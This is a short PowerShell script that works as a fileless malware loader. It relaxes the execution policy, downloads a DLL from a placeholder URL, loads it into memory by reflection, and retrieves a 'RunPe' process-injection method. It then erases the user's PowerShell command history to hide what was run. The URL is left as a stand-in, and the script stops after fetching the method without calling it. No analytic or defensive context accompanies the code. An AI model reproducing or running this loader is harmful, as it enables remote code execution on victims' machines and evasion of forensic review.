Get-ExecutionPolicy
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser

$ProgressPreference = "SilentlyContinue"
Clear-Host


$AppUrl = "URL DLL"
$AppResponse = Invoke-WebRequest -Uri $AppUrl -UseBasicParsing
$AppBytes =  $AppResponse.Content -as [byte[]]
$AppAssembly = [System.Reflection.Assembly]::Load($AppBytes)

$InjectFunction = $AppAssembly.GetType("Loader.c_Loader").GetMethod("RunPe")

$file = "C:\Users\$($env:USERNAME)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path -Path $file) {
    Clear-Content -Path $file
}
